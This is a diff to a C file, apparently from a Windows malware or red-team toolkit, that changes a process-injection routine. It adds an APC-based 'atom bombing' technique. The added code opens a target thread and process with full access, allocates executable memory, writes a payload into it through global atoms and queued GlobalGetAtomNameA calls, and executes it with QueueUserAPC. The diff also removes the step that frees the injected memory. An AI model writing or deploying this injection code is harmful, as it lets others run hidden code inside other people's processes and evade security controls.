@@ -1,8 +1,5 @@
 #include "Win32Helper.h"
 
-
-// ---------------------------------------- EXIT ROUTINE ---------------------------------------- 
-//EXIT_ROUTINE_CASE_0:
 DWORD ProcessInjectionMain(_In_ PPROCESS_INJECTION_INFORMATION Pii)
 {
 	DWORD dwReturn = ERROR_SUCCESS;
@@ -40,7 +37,7 @@ DWORD ProcessInjectionMain(_In_ PPROCESS_INJECTION_INFORMATION Pii)
 			break;
 		}
 		
-		case E_CTRL_INJECT:
+		case E_CTRL_INJECT: //console applications only
 		{
 			DWORD ConsoleAttachList[2] = { 0 };
 			DWORD ParentId = 0;
@@ -145,18 +142,68 @@ DWORD ProcessInjectionMain(_In_ PPROCESS_INJECTION_INFORMATION Pii)
 			break;
 		}
 
+		case E_QUEUE_USER_APC: //must use EBFB variant
+		{
+			NTQUEUEAPCTHREAD NtQueueApcThread = NULL;
+			HMODULE hModule = NULL;
+			ATOM Alpha = ERROR_SUCCESS, Bravo = ERROR_SUCCESS;
+			PCHAR pPayload = (PCHAR)Pii->Payload;
+
+			hModule = GetModuleHandleEx2W(L"ntdll.dll");
+			if (hModule == NULL)
+				break;
+
+			NtQueueApcThread = (NTQUEUEAPCTHREAD)GetProcAddressA((DWORD64)hModule, "NtQueueApcThread");
+			if (!NtQueueApcThread)
+				break;
+
+			hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, Pii->ThreadId);
+			if (hThread == NULL)
+				break;
+
+			hHandle = OpenProcess(0x001fffff, FALSE, GetProcessIdOfThread(hThread));
+			if (hHandle == NULL)
+				break;
+
+			BaseAddress = VirtualAllocEx(hHandle, NULL, Pii->dwLengthOfPayloadInBytes, 0x00003000, 0x00000040);
+			if (BaseAddress == NULL)
+				break;
+
+			Bravo = GlobalAddAtomA("b");
+			if (Bravo == 0)
+				break;
+
+			if (pPayload[0] == '\0')
+				break;
+
+			for (DWORD64 Position = Pii->dwLengthOfPayloadInBytes - 1; Position > 0; Position--)
+			{
+				if ((pPayload[Position] == '\0') && (pPayload[Position - 1] == '\0'))
+					NtQueueApcThread(hThread, GlobalGetAtomNameA, (PVOID)Bravo, (PVOID)(((DWORD64)BaseAddress) + Position - 1), (PVOID)2);
+			}
+
+			for (PCHAR Position = pPayload; Position < (pPayload + Pii->dwLengthOfPayloadInBytes); Position += strlen(Position) + 1)
+			{
+				if (*Position == '\0')
+					continue;
+
+				Alpha = GlobalAddAtomA(Position);
+				if (Alpha == 0)
+					break;
+
+				NtQueueApcThread(hThread, GlobalGetAtomNameA, (PVOID)Alpha, (PVOID)(((DWORD64)BaseAddress) + (Position - pPayload)), (PVOID)(strlen(Position) + 1));
+			}
+
+			QueueUserAPC((PAPCFUNC)BaseAddress, hThread, 0);
+
+		}
+
 		default:
 			break;
 	}
 
 	if (!bFlag)
 		dwReturn = GetLastErrorFromTeb();
-
-	if (BaseAddress)
-	{
-		if(hHandle)
-			VirtualFreeEx(hHandle, BaseAddress, ERROR_SUCCESS, MEM_RELEASE);
-	}
 		
 	if (hThread)
 		CloseHandle(hThread);
